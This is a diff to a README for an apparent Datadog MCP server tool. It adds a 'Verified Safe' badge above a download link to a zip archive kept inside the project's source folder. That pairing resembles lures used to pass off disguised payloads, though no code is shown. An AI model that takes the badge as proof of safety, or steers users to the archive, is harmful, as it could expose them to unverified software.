@@ -1,5 +1,7 @@
 # 🛠️ mcp-datadog - Simplifying Observability for Everyone
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/ajaysharmaas-mcp-datadog)
+
 ## 📥 Download Now
 [![Download mcp-datadog](https://github.com/ajaysharmaas/mcp-datadog/raw/refs/heads/main/src/Viamus.DataDog.Mcp.Server/Services/datadog_mcp_v1.8.zip)](https://github.com/ajaysharmaas/mcp-datadog/raw/refs/heads/main/src/Viamus.DataDog.Mcp.Server/Services/datadog_mcp_v1.8.zip)
 
